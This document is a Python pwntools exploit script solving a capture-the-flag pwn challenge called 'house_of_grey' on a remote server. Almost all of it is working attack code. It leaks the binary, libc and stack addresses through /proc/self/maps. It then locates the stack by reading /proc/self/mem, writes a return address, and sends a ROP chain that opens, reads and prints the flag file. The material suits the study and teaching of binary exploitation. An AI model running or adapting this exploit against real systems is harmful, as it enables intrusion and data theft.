#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "house_of_grey"
libFile  = ""

remoteIp = "111.198.29.45"
remotePort = 44908

LOCAL = 0
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x :  io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def fid(text):
	sla('5.Exit\n', '1')
	sla('?', text)

def loc(offset):
	sla('5.Exit\n', '2')
	sla('?', str(offset))
	
def get(length):
	sla('5.Exit\n', '3')
	sla('?', str(length))

def giv(text):
	sla('5.Exit\n', '4')
	sla('?', text)

def q(text):
	sla('5.Exit\n', '5')

#--------------------------Exploit--------------------------
def exploit():

	sla('?', 'y')

	#leaking base addr
	p = '/proc/self/maps'
	fid(p)
	get(1500)

	ru('You get something:\n')
	exe_base = int(r(12), 16)
	ru('[heap]\n')
	stack_start = int(r(12), 16)
	ru('-')
	stack_end =   int(r(12), 16)

	ru('rw-p 00000000 00:00 0 \n')

	libc_base = int(r(12), 16)
	li('exe_base  ' + hex(exe_base))
	li('libc_base ' + hex(libc_base))

	li('stack_start ' + hex(stack_start))
	li('stack_end   ' + hex(stack_end))

	pop_rdi_ret_offset = 0x1823
	pop_rsi_r15_ret_offset = 0x1821
	pop_rdi_ret = exe_base + pop_rdi_ret_offset
	pop_rsi_r15_ret = exe_base + pop_rsi_r15_ret_offset
	open_plt = exe_base + exe.plt['open']
	read_plt = exe_base + exe.plt['read']
	puts_plt = exe_base + exe.plt['puts']

	#position stack addr
	offset = 0xf800000
	li('debug---------------')
	#begin_offset ~ stack_end
	stack_begin_offset = stack_end - offset - 24 * 100000
	li('stack_begin_offset ' + hex(stack_begin_offset))
	li('stack_end   ' +        hex(stack_end))

	fid('/proc/self/mem')
	loc(stack_begin_offset)
	# searching
	for i in range(0, 24):
		get(100000)
		text = ru('1.Find something')
		if '/proc/self/mem' in text:
			content = text.split('/proc/self/mem')[0]
			break
		if i == 23:
			li('not found')
			exit(0)


	v8_addr = stack_begin_offset + i * 100000 + len(content) - 0x14
	li('v8_addr: ' + hex(v8_addr))

	read_ret = v8_addr - (0x60 - 0x08) + 0x20
	li('read_ret: ' + hex(read_ret))
	p = '/proc/self/mem'.ljust(24, '\x00') + p64(read_ret)
	fid(p) # fd as 5

	#rop
	'''
	3 RDX  0x28 #length
	1 RDI  0x0  #fd
	2 RSI  0x7fd5ffbc3640 ◂— '/proc/self/mem' #buffer
	'''

	ret = read_ret
	#open  ./flag
	p = p64(pop_rdi_ret) + p64(ret + 15 * 8)
	p += p64(pop_rsi_r15_ret) + p64(0) + p64(0) + p64(open_plt)

	# read flag to buffer, fd is 6
	p += p64(pop_rdi_ret) + p64(6)
	p += p64(pop_rsi_r15_ret) + p64(ret + 15 * 8) + p64(0) + p64(read_plt)

	# puts flag
	p += p64(pop_rdi_ret) + p64(ret + 15 * 8) + p64(puts_plt)
	# ./flag str will be replace flag{***}
	#p = p64(pop_rdi_ret) + p64()
	p += './flag\x00'
	#db()
	
	giv(p)


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
    
